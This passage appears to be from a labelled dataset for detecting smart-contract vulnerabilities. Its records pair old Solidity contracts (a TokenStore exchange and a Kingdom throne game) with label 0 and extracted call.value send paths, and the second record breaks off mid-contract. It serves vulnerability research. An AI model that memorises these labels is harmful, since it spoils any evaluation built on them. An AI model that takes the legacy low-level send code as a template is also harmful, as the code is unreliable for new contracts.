{"sol name": "14274.sol", "label": 0, "first path": "function withdraw(uint _amount) { require(tokens[0][msg.sender] >= _amount); tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], _amount); if (!msg.sender.call.value(_amount)()) { revert(); Withdraw(0, msg.sender, _amount, tokens[0][msg.sender]); function instantTrade(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive,   uint _expires, uint _nonce, address _user, uint8 _v, bytes32 _r, bytes32 _s, uint _amount, address _store) payable { uint totalValue = safeMul(_amount, 1004) / 1000; if (_tokenGet == address(0)) { if (msg.value != totalValue) { revert(); TokenStore(_store).deposit.value(totalValue)(); } else { if (!Token(_tokenGet).transferFrom(msg.sender, this, totalValue)) { revert(); if (!Token(_tokenGet).approve(_store, totalValue)) { revert(); TokenStore(_store).depositToken(_tokenGet, totalValue); TokenStore(_store).trade(_tokenGet, _amountGet, _tokenGive, _amountGive, _expires, _nonce, _user, _v, _r, _s, _amount); totalValue = TokenStore(_store).balanceOf(_tokenGive, this); uint customerValue = safeMul(_amountGive, _amount) / _amountGet; if (_tokenGive == address(0)) { TokenStore(_store).withdraw(totalValue); msg.sender.transfer(customerValue); } else { TokenStore(_store).withdrawToken(_tokenGive, totalValue); if (!Token(_tokenGive).transfer(msg.sender, customerValue)) { revert(); ", "second path": "function withdraw(uint _amount) { require(tokens[0][msg.sender] >= _amount); tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], _amount); if (!msg.sender.call.value(_amount)()) { revert(); Withdraw(0, msg.sender, _amount, tokens[0][msg.sender]); function instantTrade(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive,   uint _expires, uint _nonce, address _user, uint8 _v, bytes32 _r, bytes32 _s, uint _amount, address _store) payable { uint totalValue = safeMul(_amount, 1004) / 1000; if (_tokenGet == address(0)) { if (msg.value != totalValue) { revert(); TokenStore(_store).deposit.value(totalValue)(); } else { if (!Token(_tokenGet).transferFrom(msg.sender, this, totalValue)) { revert(); if (!Token(_tokenGet).approve(_store, totalValue)) { revert(); TokenStore(_store).depositToken(_tokenGet, totalValue); TokenStore(_store).trade(_tokenGet, _amountGet, _tokenGive, _amountGive, _expires, _nonce, _user, _v, _r, _s, _amount); totalValue = TokenStore(_store).balanceOf(_tokenGive, this); uint customerValue = safeMul(_amountGive, _amount) / _amountGet; if (_tokenGive == address(0)) { TokenStore(_store).withdraw(totalValue); msg.sender.transfer(customerValue); } else { TokenStore(_store).withdrawToken(_tokenGive, totalValue); if (!Token(_tokenGive).transfer(msg.sender, customerValue)) { revert(); ", "third path": "function withdraw(uint _amount) { require(tokens[0][msg.sender] >= _amount); tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], _amount); if (!msg.sender.call.value(_amount)()) { revert(); Withdraw(0, msg.sender, _amount, tokens[0][msg.sender]); function instantTrade(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive,   uint _expires, uint _nonce, address _user, uint8 _v, bytes32 _r, bytes32 _s, uint _amount, address _store) payable { uint totalValue = safeMul(_amount, 1004) / 1000; if (_tokenGet == address(0)) { if (msg.value != totalValue) { revert(); TokenStore(_store).deposit.value(totalValue)(); } else { if (!Token(_tokenGet).transferFrom(msg.sender, this, totalValue)) { revert(); if (!Token(_tokenGet).approve(_store, totalValue)) { revert(); TokenStore(_store).depositToken(_tokenGet, totalValue); TokenStore(_store).trade(_tokenGet, _amountGet, _tokenGive, _amountGive, _expires, _nonce, _user, _v, _r, _s, _amount); totalValue = TokenStore(_store).balanceOf(_tokenGive, this); uint customerValue = safeMul(_amountGive, _amount) / _amountGet; if (_tokenGive == address(0)) { TokenStore(_store).withdraw(totalValue); msg.sender.transfer(customerValue); } else { TokenStore(_store).withdrawToken(_tokenGive, totalValue); if (!Token(_tokenGive).transfer(msg.sender, customerValue)) { revert(); ", "long path": "pragma solidity ^0.4.19; contract Token { string public name; string public symbol; uint8 public decimals; function totalSupply() constant returns (uint256 supply); function balanceOf(address _owner) constant returns (uint256 balance); function transfer(address _to, uint256 _value) returns (bool success); function transferFrom(address _from, address _to, uint256 _value) returns (bool success); function approve(address _spender, uint256 _value) returns (bool success); function allowance(address _owner, address _spender) constant returns (uint256 remaining); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } contract SafeMath { function safeMul(uint a, uint b) internal returns (uint) { uint c = a * b; assert(a == 0 || c / a == b); return c; } function safeSub(uint a, uint b) internal returns (uint) { assert(b <= a); return a - b; } function safeAdd(uint a, uint b) internal returns (uint) { uint c = a + b; assert(c>=a && c>=b); return c; } } contract Ownable { address public owner; function Ownable() { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address _newOwner) onlyOwner { require(_newOwner != address(0)); owner = _newOwner; } } contract AccountModifiersInterface { function accountModifiers(address _user) constant returns(uint takeFeeDiscount, uint rebatePercentage); function tradeModifiers(address _maker, address _taker) constant returns(uint takeFeeDiscount, uint rebatePercentage); } contract TradeTrackerInterface { function tradeComplete(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive, address _get, address _give, uint _takerFee, uint _makerRebate); } contract TokenStore is SafeMath, Ownable { address feeAccount; address accountModifiers; address tradeTracker; uint public fee; mapping (address => mapping (address => uint)) public tokens; mapping (address => mapping (bytes32 => uint)) public orderFills; address public successor; address public predecessor; bool public deprecated; uint16 public version; event Cancel(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s); event Trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, address get, address give, uint nonce); event Deposit(address token, address user, uint amount, uint balance); event Withdraw(address token, address user, uint amount, uint balance); event FundsMigrated(address user); function TokenStore(uint _fee, address _predecessor) { feeAccount = owner; fee = _fee; predecessor = _predecessor; deprecated = false; if (predecessor != address(0)) { version = TokenStore(predecessor).version() + 1; } else { version = 1; } } function() { revert(); } modifier deprecable() { require(!deprecated); _; } function deprecate(bool _deprecated, address _successor) onlyOwner { deprecated = _deprecated; successor = _successor; } function changeFeeAccount(address _feeAccount) onlyOwner { require(_feeAccount != address(0)); feeAccount = _feeAccount; } function changeAccountModifiers(address _accountModifiers) onlyOwner { accountModifiers = _accountModifiers; } function changeTradeTracker(address _tradeTracker) onlyOwner { tradeTracker = _tradeTracker; } function changeFee(uint _fee) onlyOwner { require(_fee <= fee); fee = _fee; } function getAccountModifiers() constant returns(uint takeFeeDiscount, uint rebatePercentage) { if (accountModifiers != address(0)) { return AccountModifiersInterface(accountModifiers).accountModifiers(msg.sender); } else { return (0, 0); } } function deposit() payable deprecable { tokens[0][msg.sender] = safeAdd(tokens[0][msg.sender], msg.value); Deposit(0, msg.sender, msg.value, tokens[0][msg.sender]); } function withdraw(uint _amount) { require(tokens[0][msg.sender] >= _amount); tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], _amount); if (!msg.sender.call.value(_amount)()) { revert(); } Withdraw(0, msg.sender, _amount, tokens[0][msg.sender]); } function depositToken(address _token, uint _amount) deprecable { require(_token != 0); if (!Token(_token).transferFrom(msg.sender, this, _amount)) { revert(); } tokens[_token][msg.sender] = safeAdd(tokens[_token][msg.sender], _amount); Deposit(_token, msg.sender, _amount, tokens[_token][msg.sender]); } function withdrawToken(address _token, uint _amount) { require(_token != 0); require(tokens[_token][msg.sender] >= _amount); tokens[_token][msg.sender] = safeSub(tokens[_token][msg.sender], _amount); if (!Token(_token).transfer(msg.sender, _amount)) { revert(); } Withdraw(_token, msg.sender, _amount, tokens[_token][msg.sender]); } function balanceOf(address _token, address _user) constant returns (uint) { return tokens[_token][_user]; } function trade(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive,  uint _expires, uint _nonce, address _user, uint8 _v, bytes32 _r, bytes32 _s, uint _amount) { bytes32 hash = sha256(this, _tokenGet, _amountGet, _tokenGive, _amountGive, _expires, _nonce); if (ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash), _v, _r, _s) != _user ||      block.number > _expires ||      safeAdd(orderFills[_user][hash], _amount) > _amountGet) { revert(); } tradeBalances(_tokenGet, _amountGet, _tokenGive, _amountGive, _user, msg.sender, _amount); orderFills[_user][hash] = safeAdd(orderFills[_user][hash], _amount); Trade(_tokenGet, _amount, _tokenGive, _amountGive * _amount / _amountGet, _user, msg.sender, _nonce); } function tradeBalances(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive,     address _user, address _caller, uint _amount) private { uint feeTakeValue = safeMul(_amount, fee) / (1 ether); uint rebateValue = 0; uint tokenGiveValue = safeMul(_amountGive, _amount) / _amountGet; if (accountModifiers != address(0)) { var (feeTakeDiscount, rebatePercentage) = AccountModifiersInterface(accountModifiers).tradeModifiers(_user, _caller); if (feeTakeDiscount > 100) { feeTakeDiscount = 0; } if (rebatePercentage > 100) { rebatePercentage = 0; } feeTakeValue = safeMul(feeTakeValue, 100 - feeTakeDiscount) / 100; rebateValue = safeMul(rebatePercentage, feeTakeValue) / 100; } tokens[_tokenGet][_user] = safeAdd(tokens[_tokenGet][_user], safeAdd(_amount, rebateValue)); tokens[_tokenGet][_caller] = safeSub(tokens[_tokenGet][_caller], safeAdd(_amount, feeTakeValue)); tokens[_tokenGive][_user] = safeSub(tokens[_tokenGive][_user], tokenGiveValue); tokens[_tokenGive][_caller] = safeAdd(tokens[_tokenGive][_caller], tokenGiveValue); tokens[_tokenGet][feeAccount] = safeAdd(tokens[_tokenGet][feeAccount], safeSub(feeTakeValue, rebateValue)); if (tradeTracker != address(0)) { TradeTrackerInterface(tradeTracker).tradeComplete(_tokenGet, _amount, _tokenGive, tokenGiveValue, _user, _caller, feeTakeValue, rebateValue); } } function testTrade(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive, uint _expires, uint _nonce, address _user, uint8 _v, bytes32 _r, bytes32 _s, uint _amount, address _sender) constant returns(bool) { if (tokens[_tokenGet][_sender] < _amount ||  availableVolume(_tokenGet, _amountGet, _tokenGive, _amountGive, _expires, _nonce, _user, _v, _r, _s) < _amount) { return false; } return true; } function availableVolume(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive, uint _expires,  uint _nonce, address _user, uint8 _v, bytes32 _r, bytes32 _s) constant returns(uint) { bytes32 hash = sha256(this, _tokenGet, _amountGet, _tokenGive, _amountGive, _expires, _nonce); if (ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash), _v, _r, _s) != _user ||      block.number > _expires) { return 0; } uint available1 = safeSub(_amountGet, orderFills[_user][hash]); uint available2 = safeMul(tokens[_tokenGive][_user], _amountGet) / _amountGive; if (available1 < available2) return available1; return available2; } function amountFilled(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive, uint _expires,      uint _nonce, address _user) constant returns(uint) { bytes32 hash = sha256(this, _tokenGet, _amountGet, _tokenGive, _amountGive, _expires, _nonce); return orderFills[_user][hash]; } function cancelOrder(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive, uint _expires,      uint _nonce, uint8 _v, bytes32 _r, bytes32 _s) { bytes32 hash = sha256(this, _tokenGet, _amountGet, _tokenGive, _amountGive, _expires, _nonce); if (!(ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash), _v, _r, _s) == msg.sender)) { revert(); } orderFills[msg.sender][hash] = _amountGet; Cancel(_tokenGet, _amountGet, _tokenGive, _amountGive, _expires, _nonce, msg.sender, _v, _r, _s); } function migrateFunds(address[] _tokens) { require(successor != address(0)); TokenStore newExchange = TokenStore(successor); for (uint16 n = 0; n < 20; n++) { address nextSuccessor = newExchange.successor(); if (nextSuccessor == address(this)) { revert(); } if (nextSuccessor == address(0)) { break; } newExchange = TokenStore(nextSuccessor); } uint etherAmount = tokens[0][msg.sender]; if (etherAmount > 0) { tokens[0][msg.sender] = 0; newExchange.depositForUser.value(etherAmount)(msg.sender); } for (n = 0; n < _tokens.length; n++) { address token = _tokens[n]; require(token != address(0)); uint tokenAmount = tokens[token][msg.sender]; if (tokenAmount == 0) { continue; } if (!Token(token).approve(newExchange, tokenAmount)) { revert(); } tokens[token][msg.sender] = 0; newExchange.depositTokenForUser(token, tokenAmount, msg.sender); } FundsMigrated(msg.sender); } function depositForUser(address _user) payable deprecable { require(_user != address(0)); require(msg.value > 0); TokenStore caller = TokenStore(msg.sender); require(caller.version() > 0); tokens[0][_user] = safeAdd(tokens[0][_user], msg.value); } function depositTokenForUser(address _token, uint _amount, address _user) deprecable { require(_token != address(0)); require(_user != address(0)); require(_amount > 0); TokenStore caller = TokenStore(msg.sender); require(caller.version() > 0); if (!Token(_token).transferFrom(msg.sender, this, _amount)) { revert(); } tokens[_token][_user] = safeAdd(tokens[_token][_user], _amount); } } contract InstantTrade is SafeMath, Ownable { function() payable { } function instantTrade(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive,   uint _expires, uint _nonce, address _user, uint8 _v, bytes32 _r, bytes32 _s, uint _amount, address _store) payable { uint totalValue = safeMul(_amount, 1004) / 1000; if (_tokenGet == address(0)) { if (msg.value != totalValue) { revert(); } TokenStore(_store).deposit.value(totalValue)(); } else { if (!Token(_tokenGet).transferFrom(msg.sender, this, totalValue)) { revert(); } if (!Token(_tokenGet).approve(_store, totalValue)) { revert(); } TokenStore(_store).depositToken(_tokenGet, totalValue); } TokenStore(_store).trade(_tokenGet, _amountGet, _tokenGive, _amountGive, _expires, _nonce, _user, _v, _r, _s, _amount); totalValue = TokenStore(_store).balanceOf(_tokenGive, this); uint customerValue = safeMul(_amountGive, _amount) / _amountGet; if (_tokenGive == address(0)) { TokenStore(_store).withdraw(totalValue); msg.sender.transfer(customerValue); } else { TokenStore(_store).withdrawToken(_tokenGive, totalValue); if (!Token(_tokenGive).transfer(msg.sender, customerValue)) { revert(); } } } function withdrawFees(address _token) onlyOwner { if (_token == address(0)) { msg.sender.transfer(this.balance); } else { uint amount = Token(_token).balanceOf(this); if (!Token(_token).transfer(msg.sender, amount)) { revert(); } } } } "}
{"sol name": "40341.sol", "label": 0, "first path": "function carefulSendWithFixedGas(address _toAddress,  uint _valueWei,  uint _extraGasIncluded ) internal returns (bool success) { return _toAddress.call.value(_valueWei).gas(_extraGasIncluded)(); contract FundsHolderMixin is ReentryProtectorMixin, CarefulSenderMixin { mapping (address => uint) funds; event FundsWithdrawnEvent( address fromAddress, address toAddress, uint valueWei ); function withdrawFundsAdvancedRP(address _toAddress, uint _valueWei, uint _extraGasIncluded ) internal { if (msg.value != 0) {   throw;   } address fromAddress = msg.sender; if (_valueWei > funds[fromAddress]) {  throw;    } funds[fromAddress] -= _valueWei; bool sentOk = carefulSendWithFixedGas(  _toAddress,   _valueWei,   _extraGasIncluded ); if (!sentOk) { throw;   } FundsWithdrawnEvent(fromAddress, _toAddress, _valueWei); contract MoneyRounderMixin { function compensateLatestMonarch(uint _compensationWei) internal { address compensationAddress = latestMonarchInternal().compensationAddress; latestMonarchInternal().compensationWei = _compensationWei; bool sentOk = carefulSendWithFixedGas(  compensationAddress, _compensationWei,suggestedExtraGasToIncludeWithSends  ); if (sentOk) { CompensationSentEvent(compensationAddress, _compensationWei); } else { funds[compensationAddress] += _compensationWei; CompensationFailEvent(compensationAddress, _compensationWei); contract KingdomFactory { ", "second path": "function carefulSendWithFixedGas(address _toAddress,  uint _valueWei,  uint _extraGasIncluded ) internal returns (bool success) { return _toAddress.call.value(_valueWei).gas(_extraGasIncluded)(); contract FundsHolderMixin is ReentryProtectorMixin, CarefulSenderMixin { mapping (address => uint) funds; event FundsWithdrawnEvent( address fromAddress, address toAddress, uint valueWei ); function withdrawFundsAdvancedRP(address _toAddress, uint _valueWei, uint _extraGasIncluded ) internal { if (msg.value != 0) {   throw;   } address fromAddress = msg.sender; if (_valueWei > funds[fromAddress]) {  throw;    } funds[fromAddress] -= _valueWei; bool sentOk = carefulSendWithFixedGas(  _toAddress,   _valueWei,   _extraGasIncluded ); if (!sentOk) { throw;   } FundsWithdrawnEvent(fromAddress, _toAddress, _valueWei); contract MoneyRounderMixin { function compensateLatestMonarch(uint _compensationWei) internal { address compensationAddress = latestMonarchInternal().compensationAddress; latestMonarchInternal().compensationWei = _compensationWei; bool sentOk = carefulSendWithFixedGas(  compensationAddress, _compensationWei,suggestedExtraGasToIncludeWithSends  ); if (sentOk) { CompensationSentEvent(compensationAddress, _compensationWei); } else { funds[compensationAddress] += _compensationWei; CompensationFailEvent(compensationAddress, _compensationWei); contract KingdomFactory { ", "third path": "function carefulSendWithFixedGas(address _toAddress,  uint _valueWei,  uint _extraGasIncluded ) internal returns (bool success) { return _toAddress.call.value(_valueWei).gas(_extraGasIncluded)(); contract FundsHolderMixin is ReentryProtectorMixin, CarefulSenderMixin { mapping (address => uint) funds; event FundsWithdrawnEvent( address fromAddress, address toAddress, uint valueWei ); function withdrawFundsAdvancedRP(address _toAddress, uint _valueWei, uint _extraGasIncluded ) internal { if (msg.value != 0) {   throw;   } address fromAddress = msg.sender; if (_valueWei > funds[fromAddress]) {  throw;    } funds[fromAddress] -= _valueWei; bool sentOk = carefulSendWithFixedGas(  _toAddress,   _valueWei,   _extraGasIncluded ); if (!sentOk) { throw;   } FundsWithdrawnEvent(fromAddress, _toAddress, _valueWei); contract MoneyRounderMixin { function compensateLatestMonarch(uint _compensationWei) internal { address compensationAddress = latestMonarchInternal().compensationAddress; latestMonarchInternal().compensationWei = _compensationWei; bool sentOk = carefulSendWithFixedGas(  compensationAddress, _compensationWei,suggestedExtraGasToIncludeWithSends  ); if (sentOk) { CompensationSentEvent(compensationAddress, _compensationWei); } else { funds[compensationAddress] += _compensationWei; CompensationFailEvent(compensationAddress, _compensationWei); contract KingdomFactory { ", "long path": "contract ReentryProtectorMixin { bool reentryProtector; function externalEnter() internal { if (reentryProtector) { throw; } reentryProtector = true; } function externalLeave() internal { reentryProtector = false; } } contract CarefulSenderMixin { uint constant suggestedExtraGasToIncludeWithSends = 23000; function carefulSendWithFixedGas(address _toAddress,  uint _valueWei,  uint _extraGasIncluded ) internal returns (bool success) { return _toAddress.call.value(_valueWei).gas(_extraGasIncluded)(); } } contract FundsHolderMixin is ReentryProtectorMixin, CarefulSenderMixin { mapping (address => uint) funds; event FundsWithdrawnEvent( address fromAddress, address toAddress, uint valueWei ); function fundsOf(address _address) constant returns (uint valueWei) { return funds[_address]; } function withdrawFunds() { externalEnter(); withdrawFundsRP(); externalLeave(); } function withdrawFundsAdvanced( address _toAddress, uint _valueWei, uint _extraGas ) { externalEnter(); withdrawFundsAdvancedRP(_toAddress, _valueWei, _extraGas); externalLeave(); } function withdrawFundsRP() internal { address fromAddress = msg.sender; address toAddress = fromAddress; uint allAvailableWei = funds[fromAddress]; withdrawFundsAdvancedRP( toAddress, allAvailableWei, suggestedExtraGasToIncludeWithSends ); } function withdrawFundsAdvancedRP(address _toAddress, uint _valueWei, uint _extraGasIncluded ) internal { if (msg.value != 0) {   throw;   } address fromAddress = msg.sender; if (_valueWei > funds[fromAddress]) {  throw;    } funds[fromAddress] -= _valueWei; bool sentOk = carefulSendWithFixedGas(  _toAddress,   _valueWei,   _extraGasIncluded ); if (!sentOk) { throw;   } FundsWithdrawnEvent(fromAddress, _toAddress, _valueWei); } } contract MoneyRounderMixin { function roundMoneyDownNicely(uint _rawValueWei) constant internal returns (uint nicerValueWei) { if (_rawValueWei < 1 finney) { return _rawValueWei; } else if (_rawValueWei < 10 finney) { return 10 szabo * (_rawValueWei / 10 szabo); } else if (_rawValueWei < 100 finney) { return 100 szabo * (_rawValueWei / 100 szabo); } else if (_rawValueWei < 1 ether) { return 1 finney * (_rawValueWei / 1 finney); } else if (_rawValueWei < 10 ether) { return 10 finney * (_rawValueWei / 10 finney); } else if (_rawValueWei < 100 ether) { return 100 finney * (_rawValueWei / 100 finney); } else if (_rawValueWei < 1000 ether) { return 1 ether * (_rawValueWei / 1 ether); } else if (_rawValueWei < 10000 ether) { return 10 ether * (_rawValueWei / 10 ether); } else { return _rawValueWei; } } function roundMoneyUpToWholeFinney(uint _valueWei) constant internal returns (uint valueFinney) { return (1 finney + _valueWei - 1 wei) / 1 finney; } } contract NameableMixin { uint constant minimumNameLength = 1; uint constant maximumNameLength = 25; string constant nameDataPrefix = \"NAME:\"; function validateNameInternal(string _name) constant internal returns (bool allowed) { bytes memory nameBytes = bytes(_name); uint lengthBytes = nameBytes.length; if (lengthBytes < minimumNameLength || lengthBytes > maximumNameLength) { return false; } bool foundNonPunctuation = false; for (uint i = 0; i < lengthBytes; i++) { byte b = nameBytes[i]; if ( (b >= 48 && b <= 57) || (b >= 65 && b <= 90) || (b >= 97 && b <= 122) ) { foundNonPunctuation = true; continue; } if ( b == 32 || b == 33 || b == 40 || b == 41 || b == 45 || b == 46 || b == 95 ) { continue; } return false; } return foundNonPunctuation; } function extractNameFromData(bytes _data) constant internal returns (string extractedName) { uint expectedPrefixLength = (bytes(nameDataPrefix)).length; if (_data.length < expectedPrefixLength) { throw; } uint i; for (i = 0; i < expectedPrefixLength; i++) { if ((bytes(nameDataPrefix))[i] != _data[i]) { throw; } } uint payloadLength = _data.length - expectedPrefixLength; if (payloadLength < minimumNameLength || payloadLength > maximumNameLength) { throw; } string memory name = new string(payloadLength); for (i = 0; i < payloadLength; i++) { (bytes(name))[i] = _data[expectedPrefixLength + i]; } return name; } function computeNameFuzzyHash(string _name) constant internal returns (uint fuzzyHash) { bytes memory nameBytes = bytes(_name); uint h = 0; uint len = nameBytes.length; if (len > maximumNameLength) { len = maximumNameLength; } for (uint i = 0; i < len; i++) { uint mul = 128; byte b = nameBytes[i]; uint ub = uint(b); if (b >= 48 && b <= 57) { h = h * mul + ub; } else if (b >= 65 && b <= 90) { h = h * mul + ub; } else if (b >= 97 && b <= 122) { uint upper = ub - 32; h = h * mul + upper; } else { } } return h; } } contract ThroneRulesMixin { struct ThroneRules { uint startingClaimPriceWei; uint maximumClaimPriceWei; uint claimPriceAdjustPercent; uint curseIncubationDurationSeconds; uint commissionPerThousand; } } contract Kingdom is ReentryProtectorMixin, CarefulSenderMixin, FundsHolderMixin, MoneyRounderMixin, NameableMixin, ThroneRulesMixin { string public kingdomName; address public world; ThroneRules public rules; struct Monarch { address compensationAddress; string name; uint coronationTimestamp; uint claimPriceWei; uint compensationWei; } Monarch[] public monarchsByNumber; address public topWizard; address public subWizard; event ThroneClaimedEvent(uint monarchNumber); event CompensationSentEvent(address toAddress, uint valueWei); event CompensationFailEvent(address toAddress, uint valueWei); event CommissionEarnedEvent(address byAddress, uint valueWei); event WizardReplacedEvent(address oldWizard, address newWizard); function Kingdom( string _kingdomName, address _world, address _topWizard, address _subWizard, uint _startingClaimPriceWei, uint _maximumClaimPriceWei, uint _claimPriceAdjustPercent, uint _curseIncubationDurationSeconds, uint _commissionPerThousand ) { kingdomName = _kingdomName; world = _world; topWizard = _topWizard; subWizard = _subWizard; rules = ThroneRules( _startingClaimPriceWei, _maximumClaimPriceWei, _claimPriceAdjustPercent, _curseIncubationDurationSeconds, _commissionPerThousand ); monarchsByNumber.push( Monarch( 0, \"\", 0, 0, 0 ) ); } function numberOfMonarchs() constant returns (uint totalCount) { return monarchsByNumber.length - 1; } function isLivingMonarch() constant returns (bool alive) { if (numberOfMonarchs() == 0) { return false; } uint reignStartedTimestamp = latestMonarchInternal().coronationTimestamp; if (now < reignStartedTimestamp) { return true; } uint elapsedReignDurationSeconds = now - reignStartedTimestamp; if (elapsedReignDurationSeconds > rules.curseIncubationDurationSeconds) { return false; } else { return true; } } function currentClaimPriceWei() constant returns (uint priceInWei) { if (!isLivingMonarch()) { return rules.startingClaimPriceWei; } else { uint lastClaimPriceWei = latestMonarchInternal().claimPriceWei; uint newClaimPrice = (lastClaimPriceWei * (100 + rules.claimPriceAdjustPercent)) / 100; newClaimPrice = roundMoneyDownNicely(newClaimPrice); if (newClaimPrice < rules.startingClaimPriceWei) { newClaimPrice = rules.startingClaimPriceWei; } if (newClaimPrice > rules.maximumClaimPriceWei) { newClaimPrice = rules.maximumClaimPriceWei; } return newClaimPrice; } } function currentClaimPriceInFinney() constant returns (uint priceInFinney) { uint valueWei = currentClaimPriceWei(); return roundMoneyUpToWholeFinney(valueWei); } function validateProposedMonarchName(string _monarchName) constant returns (bool allowed) { return validateNameInternal(_monarchName); } function latestMonarchInternal() constant internal returns (Monarch storage monarch) { return monarchsByNumber[monarchsByNumber.length - 1]; } function () { externalEnter(); fallbackRP(); externalLeave(); } function claimThrone(string _monarchName) { externalEnter(); claimThroneRP(_monarchName); externalLeave(); } function replaceWizard(address _replacement) { externalEnter(); replaceWizardRP(_replacement); externalLeave(); } function fallbackRP() internal { if (msg.data.length == 0) { claimThroneRP(\"Anonymous\"); } else { string memory _monarchName = extractNameFromData(msg.data); claimThroneRP(_monarchName); } } function claimThroneRP( string _monarchName ) internal { address _compensationAddress = msg.sender; if (!validateNameInternal(_monarchName)) { throw; } if (_compensationAddress == 0 || _compensationAddress == address(this)) { throw; } uint paidWei = msg.value; uint priceWei = currentClaimPriceWei(); if (paidWei < priceWei) { throw; } uint excessWei = paidWei - priceWei; if (excessWei > 1 finney) { throw; } uint compensationWei; uint commissionWei; if (!isLivingMonarch()) { commissionWei = paidWei; compensationWei = 0; } else { commissionWei = (paidWei * rules.commissionPerThousand) / 1000; compensationWei = paidWei - commissionWei; } if (commissionWei != 0) { recordCommissionEarned(commissionWei); } if (compensationWei != 0) { compensateLatestMonarch(compensationWei); } monarchsByNumber.push(Monarch( _compensationAddress, _monarchName, now, priceWei, 0 )); ThroneClaimedEvent(monarchsByNumber.length - 1); } function replaceWizardRP(address replacement) internal { if (msg.value != 0) { throw; } bool replacedOk = false; address oldWizard; if (msg.sender == topWizard) { oldWizard = topWizard; topWizard = replacement; WizardReplacedEvent(oldWizard, replacement); replacedOk = true; } if (msg.sender == subWizard) { oldWizard = subWizard; subWizard = replacement; WizardReplacedEvent(oldWizard, replacement); replacedOk = true; } if (!replacedOk) { throw; } } function recordCommissionEarned(uint _commissionWei) internal { uint topWizardWei = _commissionWei / 2; uint subWizardWei = _commissionWei - topWizardWei; funds[topWizard] += topWizardWei; CommissionEarnedEvent(topWizard, topWizardWei); funds[subWizard] += subWizardWei; CommissionEarnedEvent(subWizard, subWizardWei); } function compensateLatestMonarch(uint _compensationWei) internal { address compensationAddress = latestMonarchInternal().compensationAddress; latestMonarchInternal().compensationWei = _compensationWei; bool sentOk = carefulSendWithFixedGas(  compensationAddress, _compensationWei,suggestedExtraGasToIncludeWithSends  ); if (sentOk) { CompensationSentEvent(compensationAddress, _compensationWei); } else { funds[compensationAddress] += _compensationWei; CompensationFailEvent(compensationAddress, _compensationWei); } } } contract KingdomFactory { function KingdomFactory() { } function () { throw; } function validateProposedThroneRules( uint _startingClaimPriceWei, uint _maximumClaimPriceWei, uint _claimPriceAdjustPercent, uint _curseIncubationDurationSeconds, uint _commissionPerThousand ) constant returns (bool allowed) { if (_startingClaimPriceWei < 10 finney || _startingClaimPriceWei > 100 ether) { return false; } if (_maximumClaimPriceWei < 1 ether || _maximumClaimPriceWei > 100000 ether) { return false; } if (_startingClaimPriceWei * 20 > _maximumClaimPriceWei) { return false; } if (_claimPriceAdjustPercent < 10 || _claimPriceAdjustPercent > 900) { return false; } if (_curseIncubationDurationSeconds < 2 hours || _curseIncubationDurationSeconds > 10000 days) { return false; } if (_commissionPerThousand < 10 || _commissionPerThousand > 100) { return false; } return true; } function createKingdom( string _kingdomName, address _world, address _topWizard, address _subWizard, uint _startingClaimPriceWei, uint _maximumClaimPriceWei, uint _claimPriceAdjustPercent, uint _curseIncubationDurationSeconds, uint _commissionPerThousand ) returns (Kingdom newKingdom) { if (msg.value > 0) { throw; } if (_topWizard == 0 || _subWizard == 0) { throw; } if (_topWizard == _world || _subWizard == _world) { throw; } if (!validateProposedThroneRules( _startingClaimPriceWei, _maximumClaimPriceWei, _claimPriceAdjustPercent, _curseIncubationDurationSeconds, _commissionPerThousand )) { throw; } return new Kingdom( _kingdomName, _world, _topWizard, _subWizard, _startingClaimPriceWei, _maximumClaimPriceWei, _claimPriceAdjustPercent, _curseIncubationDurationSeconds, _commissionPerThousand ); } } contract World is ReentryProtectorMixin, NameableMixin, MoneyRounderMixin, FundsHolderMixin, ThroneRulesMixin { address public topWizard; uint public kingdomCreationFeeWei; struct KingdomListing { uint kingdomNumber; string kingdomName; address kingdomContract; address kingdomCreator; uint creationTimestamp; address kingdomFactoryUsed; } KingdomListing[] public kingdomsByNumber; uint public maximumClaimPriceWei; KingdomFactory public kingdomFactory; mapping (uint => uint) kingdomNumbersByfuzzyHash; event KingdomCreatedEvent(uint kingdomNumber); event CreationFeeChangedEvent(uint newFeeWei); event FactoryChangedEvent(address newFactory); event WizardReplacedEvent(address oldWizard, address newWizard); function World( address _topWizard, uint _kingdomCreationFeeWei, KingdomFactory _kingdomFactory, uint _maximumClaimPriceWei ) { if (_topWizard == 0) { throw; } if (_maximumClaimPriceWei < 1 ether) { throw; } topWizard = _topWizard; kingdomCreationFeeWei = _kingdomCreationFeeWei; kingdomFactory = _kingdomFactory; maximumClaimPriceWei = _maximumClaimPriceWei; kingdomsByNumber.push(KingdomListing(0, \"\", 0, 0, 0, 0)); } function numberOfKingdoms() constant returns (uint totalCount) { return kingdomsByNumber.length - 1; } function findKingdomCalled(string _kingdomName) constant returns (uint kingdomNumber) { uint fuzzyHash = computeNameFuzzyHash(_kingdomName); return kingdomNumbersByfuzzyHash[fuzzyHash]; } function validateProposedKingdomName(string _kingdomName) constant returns (bool allowed) { return validateNameInternal(_kingdomName); } function validateProposedThroneRules( uint _startingClaimPriceWei, uint _claimPriceAdjustPercent, uint _curseIncubationDurationSeconds, uint _commissionPerThousand ) constant returns (bool allowed) { return kingdomFactory.validateProposedThroneRules( _startingClaimPriceWei, 